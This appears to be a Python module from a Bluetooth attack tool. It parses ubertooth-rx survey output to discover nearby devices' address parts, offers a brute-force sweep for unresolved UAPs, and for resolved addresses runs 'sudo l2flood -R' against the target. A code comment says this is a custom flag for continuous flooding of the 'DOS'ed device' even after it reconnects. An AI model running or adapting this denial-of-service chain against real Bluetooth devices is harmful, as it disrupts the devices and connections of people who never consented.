"""Interactive ubertooth-rx survey: used to discover a target LAP when the
caller doesn't already know one to hand to the sweep in sweep.py.

A BD_ADDR is NAP(2 bytes):UAP(1 byte):LAP(3 bytes). ubertooth's survey
always resolves the LAP (that's what identifies the piconet from the
channel access code) and often resolves the UAP too (via CRC-based
recovery), but never the NAP -- so survey lines come back as either:

    ??:??:BE:B4:F1:3F   <- UAP resolved (BE). Nothing left to sweep;
                           this is already a complete candidate modulo
                           the assumed NAP (--prefix, default 00:00).
                           Tagged "ready to use", not offered as a
                           sweep target.
    ??:??:??:C5:9D:87   <- UAP unresolved (extra ??). LAP (C5:9D:87) is
                           usable as known_octets for the sweep below.
                           Offered as a numbered selection target.
"""
import subprocess

from .constants import DEFAULT_SCAN_TIME, SURVEY_ADDR_RE


def prompt_scan_timeout():
    raw = input(f"Ubertooth scan duration in seconds [{DEFAULT_SCAN_TIME}]: ").strip()
    if not raw:
        return DEFAULT_SCAN_TIME
    try:
        val = int(raw)
    except ValueError:
        print(f"Not a number, using default ({DEFAULT_SCAN_TIME}).")
        return DEFAULT_SCAN_TIME
    if val <= 0:
        print(f"Must be positive, using default ({DEFAULT_SCAN_TIME}).")
        return DEFAULT_SCAN_TIME
    return val


def run_ubertooth_scan(timeout):
    """Run ubertooth-rx -z -t <timeout>, streaming its output live (so you
    still see the real-time systime=... lines) while also capturing it
    for parsing. Returns the full captured output as one string."""
    print(f"\nRunning: ubertooth-rx -z -t {timeout}\n")
    lines = []
    proc = subprocess.Popen(
        ["ubertooth-rx", "-z", "-t", str(timeout)],
        stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, bufsize=1,
    )
    try:
        for line in proc.stdout:
            print(line, end="")
            lines.append(line)
        proc.wait()
    except KeyboardInterrupt:
        proc.terminate()
        try:
            proc.wait(timeout=3)
        except subprocess.TimeoutExpired:
            proc.kill()
        raise
    return "".join(lines)


def parse_survey_results(output):
    """Parse the 'Survey Results' section of ubertooth-rx -z output.

    Returns (needs_bruteforce, ready_to_use):
      needs_bruteforce -- list of LAP strings ('C5:9D:87') whose UAP was
                           NOT resolved (the extra '??' case). These are
                           valid known_octets for the sweep.
      ready_to_use      -- list of (uap, lap) tuples whose UAP WAS
                            resolved. Nothing left to brute-force -- the
                            only unknown remaining is the NAP, which the
                            sweep never touches anyway.
    """
    lines = output.splitlines()
    try:
        start = next(i for i, l in enumerate(lines) if l.strip() == "Survey Results")
    except StopIteration:
        return [], []

    needs_bruteforce, ready_to_use = [], []
    seen_bf, seen_ready = set(), set()

    for line in lines[start + 1:]:
        line = line.strip()
        if not SURVEY_ADDR_RE.match(line):
            continue
        nap1, nap2, uap, lap1, lap2, lap3 = line.split(":")
        if "??" in (lap1, lap2, lap3):
            continue  # LAP itself unresolved -- not usable yet
        lap = f"{lap1}:{lap2}:{lap3}"
        if uap == "??":
            if lap not in seen_bf:
                seen_bf.add(lap)
                needs_bruteforce.append(lap)
        else:
            key = f"{uap}:{lap}"
            if key not in seen_ready:
                seen_ready.add(key)
                ready_to_use.append((uap, lap))

    return needs_bruteforce, ready_to_use


def _prompt_ready_or_bruteforce():
    """Both pools are non-empty -- ask which one the user wants to act on:
    an address that's already complete ('ready to use', no brute-force
    needed), or a LAP that still needs its UAP brute-forced."""
    while True:
        choice = input(
            "\nUse a ready-to-use address, or brute-force a candidate? "
            "[ready/brute]: "
        ).strip().lower()
        if choice in ("r", "ready"):
            return "ready"
        if choice in ("b", "brute", "bruteforce"):
            return "bruteforce"
        print("Please enter 'ready' or 'brute'.")


def _select_ready_address(ready_to_use, prefix):
    """Let the user pick one of the ready-to-use (known-UAP) addresses.
    Returns the full address string, or None if skipped."""
    if len(ready_to_use) == 1:
        uap, lap = ready_to_use[0]
        return f"{prefix}:{uap}:{lap}"

    while True:
        choice = input(
            f"\nSelect a ready-to-use address number (1-{len(ready_to_use)}), "
            "or press Enter to skip: "
        ).strip()
        if not choice:
            return None
        if choice.isdigit() and 1 <= int(choice) <= len(ready_to_use):
            uap, lap = ready_to_use[int(choice) - 1]
            return f"{prefix}:{uap}:{lap}"
        print("Invalid selection.")


def confirm_and_run(addr):
    """Show the command for `addr` and its comment, and run it only
    after explicit user confirmation. Output is swallowed -- only the
    "Command is running..." status line is shown, not raw stdout/stderr.

    Returns True if the command was confirmed and attempted, False if
    the user declined.
    """
    command = ["sudo", "l2flood", "-R", addr]
    comment = "# A cstume l2flood with new flag -R for continuous flood even after reconnection of the DOS'ed device"
    name = command[1] if command[0] == "sudo" else command[0]
    print(f"\nCommand to run: {' '.join(command)}  {comment}")

    choice = input(f"Proceed with {name}? [y/N]: ").strip().lower()
    if choice not in ("y", "yes"):
        print("Skipped.")
        return False

    print(f"{name} is running...")
    try:
        subprocess.run(
            command, check=False,
            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
        )
    except FileNotFoundError:
        print(f"'{command[0]}' not found on PATH.")
    return True


def select_target(needs_bruteforce, ready_to_use, prefix):
    """Show survey results and let the user pick what to do next.

    If both pools are non-empty, first asks whether to act on a
    ready-to-use (known-UAP) address or brute-force a candidate LAP. If
    only one pool is non-empty, that choice is skipped.

    Returns a (mode, value) tuple:
      ("sweep", lap) -- user picked a brute-force candidate; `lap` is
                        ready to hand to the sweep as known_octets.
      ("ready", None) -- user picked a ready-to-use address; its command
                          was shown and either run or declined -- nothing
                          further for the caller to do with this survey
                          pass.
      (None, None)    -- user skipped / nothing available.
    """
    if ready_to_use:
        print("\nReady to use (UAP already resolved -- no brute-force needed):")
        for i, (uap, lap) in enumerate(ready_to_use, 1):
            print(f"  {i}) {prefix}:{uap}:{lap}  "
                  f"(NAP assumed from --prefix; UAP+LAP confirmed by ubertooth)")

    if not ready_to_use and not needs_bruteforce:
        print("\nNo devices detected.")
        return (None, None)

    if ready_to_use and needs_bruteforce:
        mode = _prompt_ready_or_bruteforce()
    elif ready_to_use:
        mode = "ready"
    else:
        mode = "bruteforce"

    if mode == "ready":
        addr = _select_ready_address(ready_to_use, prefix)
        if addr is None:
            return (None, None)
        # Address already has a discovered UAP -- nothing left to
        # brute-force, so run the command against it directly (with its
        # own confirmation prompt) instead of touching the sweep.
        confirm_and_run(addr)
        return ("ready", None)

    if not needs_bruteforce:
        print("\nNothing left to brute-force.")
        return (None, None)

    print("\nCandidates needing UAP brute-force:")
    for i, lap in enumerate(needs_bruteforce, 1):
        print(f"  {i}) ??:{lap}")

    while True:
        choice = input("\nSelect a target number, or press Enter to skip: ").strip()
        if not choice:
            return (None, None)
        if choice.isdigit() and 1 <= int(choice) <= len(needs_bruteforce):
            return ("sweep", needs_bruteforce[int(choice) - 1])
        print("Invalid selection.")
